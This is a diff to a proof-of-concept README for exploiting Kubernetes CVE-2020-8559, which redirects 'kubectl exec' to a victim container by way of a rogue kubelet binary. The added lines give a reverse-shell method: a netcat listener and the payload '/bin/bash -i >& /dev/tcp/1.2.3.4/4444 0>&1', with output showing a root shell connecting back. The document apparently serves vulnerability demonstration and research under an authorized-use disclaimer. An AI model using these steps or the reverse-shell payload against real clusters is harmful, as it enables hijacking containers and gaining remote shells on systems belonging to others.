@@ -1,4 +1,4 @@
-# Kubernetes CVE-2020-8559 Proof of Concept PoC
+# Kubernetes CVE-2020-8559 Proof of Concept PoC Exploit
 
 __This is for demonstration purposes only. Only for use on systems you are authorized to preform administrative actions on and are authorized to exploit CVE-2020-8559 on__
 
@@ -63,9 +63,9 @@ __ProTip:__ List all of the Pods in the cluster. Then, configure this to execute
 After Configuring the attack, build a rouge `kubelet` binary
 
 ```
-cd kubernetes
+cd ~/go/src/k8s.io/kubernetes
 GO111MODULE=on go mod download
-cd kubernetes/cmd/kubelet
+cd ~/go/src/k8s.io/kubernetes/cmd/kubelet
 go build
 ```
 
@@ -85,8 +85,22 @@ Kill the `kubelet` process
 `sudo kill $PID`  
 5. If configured to attack an admin using the `kubectl` command on their local workstation, This command should return the hostname of the Victim Container instead of the container it should have been executed on
 ```
-[0038][tdwyer@tdwyer-nuc:~/CVE-2020-8559]$ kubectl exec attacker-5cf89b94db-xdbfm -- hostname
+[0038][tdwyer@tdwyer-nuc:~/CVE-2020-8559]$ kubectl exec attacker-5cf89b94db-xdbfm -- date
 victim-675759495f-pmfbk
 ```
 
+
+You can also start a reverse shell back you from any Container with
+1. Start netcat listening on your workstation  
+`nc -lv 4444`  
+2. Use this command instead  
+`/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`  
+
+Success :D  
+```
+[1617][tdwyer@tdwyer-nuc:~]$ nc -lvk 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 9.8.7.6.in-addr.arpa 46828 received!
+bash-5.0#
+```
 
